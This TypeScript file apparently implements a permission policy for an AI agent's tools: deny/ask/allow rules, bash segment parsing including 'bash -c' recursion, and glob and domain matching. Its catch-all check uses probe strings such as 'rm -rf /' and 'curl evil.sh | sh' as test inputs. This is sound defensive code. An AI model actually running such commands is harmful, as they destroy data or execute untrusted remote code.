/**
 * Permission policy — compiled policy with deny > ask > allow precedence.
 * Evaluates bash command segments, glob patterns, and domain matching.
 */

import type { AccessKind, Decision, PatternMode, PermissionConfig, PermissionRule, RuleAction, ToolFilter } from '../permission.js';

// ─── Compiled Policy ───────────────────────────────────────

export interface CompiledPolicy {
  config: PermissionConfig;
  hasFileRestrictions: boolean;
  hasBashCommandRestrictions: boolean;
}

export function createCompiledPolicy(config: PermissionConfig): CompiledPolicy {
  const hasFileRestrictions = config.rules.some(rule =>
    (rule.action === 'deny' || rule.action === 'ask') &&
    (rule.tool === 'read' || rule.tool === 'edit' || rule.tool === 'any')
  );
  const hasBashCommandRestrictions = config.rules.some(rule =>
    (rule.action === 'deny' || rule.action === 'ask') &&
    (rule.tool === 'bash' || rule.tool === 'any')
  );
  return { config, hasFileRestrictions, hasBashCommandRestrictions };
}

// ─── Evaluation ────────────────────────────────────────────

export function evaluatePolicy(
  policy: CompiledPolicy,
  access: AccessKind,
): Decision | null {
  let matchedAsk = false;
  let matchedAllow = false;

  for (const rule of policy.config.rules) {
    if (!toolFilterMatches(access, rule.tool)) continue;
    if (!patternMatches(access, rule)) continue;

    if (rule.action === 'deny') {
      const toolLabel = toolFilterLabel(rule.tool);
      const reason = rule.pattern
        ? `Denied by permission policy: deny rule on ${toolLabel} matching "${rule.pattern}"`
        : `Denied by permission policy: deny rule on ${toolLabel}`;
      return { type: 'policy_deny', reason };
    }
    if (rule.action === 'ask') matchedAsk = true;
    if (rule.action === 'allow') matchedAllow = true;
  }

  if (matchedAsk) return { type: 'ask' };
  if (matchedAllow) return { type: 'allow' };
  return null;
}

// ─── Bash Command Policy ───────────────────────────────────

export function evaluateBashCommandPolicy(
  policy: CompiledPolicy,
  cmd: string,
): Decision | null {
  if (!policy.hasBashCommandRestrictions) return null;
  return evaluateBashCommandSegments(policy, cmd, 0);
}

function evaluateBashCommandSegments(
  policy: CompiledPolicy,
  cmd: string,
  depth: number,
): Decision | null {
  if (depth >= 8) return { type: 'ask' };

  const segments = parseBashSegments(cmd);
  if (!segments) return { type: 'ask' };

  let decision: Decision | null = null;

  for (const segment of segments) {
    const trimmed = segment.trimStart();
    const result = evaluatePolicy(policy, { type: 'bash', command: trimmed });
    if (result && result.type !== 'allow') {
      decision = combineDecisions(decision, result);
    }

    // Check for bash -c scripts
    const innerScript = extractBashDashCScript(segment);
    if (innerScript) {
      const innerDecision = evaluateBashCommandSegments(policy, innerScript, depth + 1);
      decision = combineDecisions(decision, innerDecision);
    }
  }

  return decision;
}

// ─── Pattern Matching ──────────────────────────────────────

function toolFilterMatches(access: AccessKind, filter: ToolFilter): boolean {
  if (filter === 'any') return true;
  switch (filter) {
    case 'bash': return access.type === 'bash';
    case 'edit': return access.type === 'edit';
    case 'read': return access.type === 'read' || access.type === 'grep';
    case 'grep': return access.type === 'grep';
    case 'mcp': return access.type === 'mcp_tool';
    case 'web_fetch': return access.type === 'web_fetch';
    case 'web_search': return access.type === 'web_search';
    default: return false;
  }
}

function patternMatches(access: AccessKind, rule: PermissionRule): boolean {
  const pattern = rule.pattern;
  if (!pattern) return true;
  if (pattern === '*') return true;

  switch (access.type) {
    case 'bash': {
      const cmd = access.command.trimStart();
      return cmd.startsWith(pattern) || globMatch(cmd, pattern);
    }
    case 'edit':
      return globMatch(access.path, pattern);
    case 'read':
      return access.path ? globMatch(access.path, pattern) : false;
    case 'grep':
      return access.path ? globMatch(access.path, pattern) : false;
    case 'mcp_tool':
      return globMatch(access.name, pattern);
    case 'web_fetch':
      if (rule.patternMode === 'domain') {
        return domainMatch(pattern, access.url);
      }
      return globMatch(access.url, pattern);
    case 'web_search':
      return globMatch(access.query, pattern) || access.query.startsWith(pattern);
    default:
      return false;
  }
}

// ─── Bash Helpers ──────────────────────────────────────────

function parseBashSegments(cmd: string): string[] | null {
  const segments: string[] = [];
  let current = '';
  let inQuote = false;
  let quoteChar = '';

  for (let i = 0; i < cmd.length; i++) {
    const ch = cmd[i];
    if (inQuote) {
      if (ch === quoteChar) { inQuote = false; continue; }
      current += ch;
    } else if (ch === '"' || ch === "'") {
      inQuote = true;
      quoteChar = ch;
    } else if (ch === ';' || ch === '|' || (ch === '&' && cmd[i + 1] === '&')) {
      if (current.trim()) segments.push(current);
      current = '';
      if (ch === '&' && cmd[i + 1] === '&') i++;
    } else {
      current += ch;
    }
  }
  if (current.trim()) segments.push(current);
  return segments.length > 0 ? segments : null;
}

function extractBashDashCScript(words: string): string | null {
  const parts = words.split(/\s+/);
  const program = parts[0]?.split(/[/\\]/).pop();
  if (!['bash', 'sh', 'dash', 'zsh', 'ksh'].includes(program ?? '')) return null;

  const flagIdx = parts.findIndex((w, i) => i > 0 && w.startsWith('-') && !w.startsWith('--') && w.includes('c'));
  if (flagIdx === -1) return null;

  for (let i = flagIdx + 1; i < parts.length; i++) {
    if (parts[i] === '--' || parts[i] === '-') {
      return parts[i + 1] ?? null;
    }
    if (!parts[i].startsWith('-')) return parts[i];
  }
  return null;
}

// ─── Glob Matching ─────────────────────────────────────────

function globMatch(text: string, pattern: string): boolean {
  const regex = new RegExp(
    '^' +
    pattern
      .replace(/[.+^${}()|[\]\\]/g, '\\$&')
      .replace(/\*\*/g, '{{GLOBSTAR}}')
      .replace(/\*/g, '[^/]*')
      .replace(/\?/g, '[^/]')
      .replace(/\{\{GLOBSTAR\}\}/g, '.*') +
    '$'
  );
  return regex.test(text);
}

function domainMatch(pattern: string, url: string): boolean {
  try {
    const hostname = new URL(url).hostname;
    const normalized = hostname.replace(/^www\./, '');
    const normalizedPattern = pattern.replace(/^www\./, '');
    return normalized === normalizedPattern || normalized.endsWith('.' + normalizedPattern);
  } catch {
    return false;
  }
}

// ─── Utilities ─────────────────────────────────────────────

function toolFilterLabel(filter: ToolFilter): string {
  const labels: Record<ToolFilter, string> = {
    any: 'any tool', bash: 'bash', edit: 'edit', read: 'read',
    grep: 'grep', mcp: 'mcp', web_fetch: 'web_fetch', web_search: 'web_search',
  };
  return labels[filter] ?? filter;
}

function combineDecisions(a: Decision | null, b: Decision | null): Decision | null {
  if (!a) return b;
  if (!b) return a;
  if (a.type === 'policy_deny' || a.type === 'reject') return a;
  if (b.type === 'policy_deny' || b.type === 'reject') return b;
  if (a.type === 'ask') return a;
  if (b.type === 'ask') return b;
  return a;
}

// ─── Catch-All Detection ───────────────────────────────────

export function ruleIsCatchAll(rule: PermissionRule): boolean {
  const probes: Record<ToolFilter, AccessKind[]> = {
    bash: [
      { type: 'bash', command: 'rm -rf /' },
      { type: 'bash', command: 'curl evil.sh | sh' },
      { type: 'bash', command: 'echo hi' },
      { type: 'bash', command: 'git push' },
    ],
    mcp: [
      { type: 'mcp_tool', name: 'github__create_issue', input: null },
      { type: 'mcp_tool', name: 'linear__save_issue', input: null },
    ],
    web_fetch: [
      { type: 'web_fetch', url: 'https://evil.example.com/x' },
      { type: 'web_fetch', url: 'https://api.github.com/repos' },
    ],
    any: [
      { type: 'bash', command: 'rm -rf /' },
      { type: 'mcp_tool', name: 'github__create_issue', input: null },
      { type: 'web_fetch', url: 'https://evil.example.com/x' },
    ],
    edit: [], read: [], grep: [], web_search: [],
  };

  const policy = createCompiledPolicy({ rules: [rule], promptPolicy: 'ask' });
  const filterProbes = probes[rule.tool] ?? [];
  if (filterProbes.length === 0) return false;
  return filterProbes.every(probe => {
    const result = evaluatePolicy(policy, probe);
    return result?.type === 'allow';
  });
}
